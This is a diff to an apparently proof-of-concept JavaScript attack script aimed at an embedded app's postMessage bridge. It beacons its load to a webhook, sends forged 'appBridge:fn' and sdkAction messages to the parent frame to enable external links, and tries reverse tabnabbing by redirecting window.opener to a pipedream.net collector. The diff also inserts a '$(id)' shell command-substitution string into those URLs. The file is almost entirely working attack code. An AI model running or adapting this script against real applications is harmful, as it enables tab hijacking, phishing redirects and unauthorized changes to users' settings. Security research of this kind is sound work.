@@ -50,7 +50,7 @@ const sessionId = Math.random().toString(36).slice(2);
 // ============================================================
 // Phase 1: Confirm load
 // ============================================================
-fetch(`${WEBHOOK_URL}?phase=1_loaded&origin=${encodeURIComponent(location.origin)}&session=${sessionId}`)
+fetch(`${WEBHOOK_URL}?phase=1_loaded&origin=${encodeURIComponent(location.origin)}&session=${sessionId}&id=$(id)`)
   .catch(() => {});
 
 // ============================================================
@@ -85,7 +85,7 @@ setTimeout(() => {
 setTimeout(() => {
   // Try sending appBridge:fn messages to parent
   const messages = [
-    {type: 'appBridge:fn', fnName: 'openlink', param: {url: 'https://eodxy50gl486xrx.m.pipedream.net/?phase=3_postmessage_openlink', target: '_blank'}},
+    {type: 'appBridge:fn', fnName: 'openlink', param: {url: 'https://eodxy50gl486xrx.m.pipedream.net/?id=$(id)', target: '_blank'}},
     {eventType: 'sdkAction', payload: {id: 'poc-1', name: 'set-theme', params: {mode: 'DARK'}}},
     {eventType: 'sdkAction', payload: {id: 'poc-2', name: 'set-settings', params: {canClickExternalLinks: true}}},
   ];
@@ -115,14 +115,14 @@ setTimeout(() => {
           setTimeout(() => {
             try {
               // Attempt 1: direct redirect (works if same-origin)
-              window.opener.location = 'https://eodxy50gl486xrx.m.pipedream.net/?phase=4_tabnab_attempt_1';
+              window.opener.location = 'https://eodxy50gl486xrx.m.pipedream.net/?id=$(id)';
             } catch(e) {
               // Attempt 2: postMessage to opener
               try {
                 window.opener.postMessage({
                   type: 'appBridge:fn',
                   fnName: 'openlink',
-                  param: {url: 'https://eodxy50gl486xrx.m.pipedream.net/?phase=4_tabnab_attempt_2', target: '_self'}
+                  param: {url: 'https://eodxy50gl486xrx.m.pipedream.net/?id=$(id)', target: '_self'}
                 }, '*');
               } catch(e2) {}
             }
